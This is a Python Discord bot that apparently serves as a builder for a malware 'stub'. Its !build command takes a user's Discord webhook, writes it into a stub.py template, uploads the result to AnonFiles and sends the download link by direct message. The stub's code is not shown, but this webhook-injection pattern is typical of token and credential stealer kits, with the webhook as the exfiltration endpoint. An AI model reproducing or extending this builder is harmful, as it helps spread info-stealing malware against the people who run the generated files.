import discord
import asyncio
import requests
import time
from discord.ext import commands
from dotenv import load_dotenv
import os
import shutil

load_dotenv() 

intents = discord.Intents.all()
intents.guild_messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    print('------')

@bot.command()
async def build(ctx):
    await ctx.send("Please provide your webhook:")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        webhook_msg = await bot.wait_for('message', check=check, timeout=30)
        webhook_url = webhook_msg.content.strip()

        if not webhook_url.startswith("https://discord.com/api/webhooks/"):
            await ctx.send("Invalid webhook URL!")
            return

        embed = discord.Embed(title="Building Process", description="Building...")
        embed.set_image(url="https://media.discordapp.net/attachments/1103810449323069473/1115445703074906172/Venom_TOOLS.gif")
        message = await ctx.send(embed=embed)

        await asyncio.sleep(6)

        embed.description = "Uploading to AnonFiles..."
        await message.edit(embed=embed)

        await asyncio.sleep(6)

        embed.description = "Done! Check your DMs!"
        await message.edit(embed=embed)

        with open('stub.py', 'r') as f:
            content = f.read()
        content = content.replace('%webhook%', webhook_url)
        with open('modified_stub.py', 'w') as f:
            f.write(content)

        files = {'file': open('modified_stub.py', 'rb')}
        response = requests.post('https://api.anonfiles.com/upload', files=files)

        if response.status_code == 200:
            file_url = response.json()['data']['file']['url']['full']
            await ctx.author.send(f"Your stub is located at: {file_url}")
        else:
            await ctx.author.send("An error occurred while uploading the file.")
            
            # Copy modified_stub.py to the 'dist' folder
            script_path = os.path.abspath(__file__)
            project_root = os.path.dirname(script_path)
            dist_folder = os.path.join(project_root, 'dist')
            destination_file = os.path.join(dist_folder, 'modified_stub.py')
            shutil.copyfile('modified_stub.py', destination_file)

    except asyncio.TimeoutError:
        await ctx.send("You took too long to respond!")

@bot.event
async def on_message(message):
    await bot.process_commands(message)


    if message.author == bot.user:
        return

    if message.content.startswith('Hello'):
        await message.channel.send('Hi there!')


bot.run(os.getenv('BOT_TOKEN'))
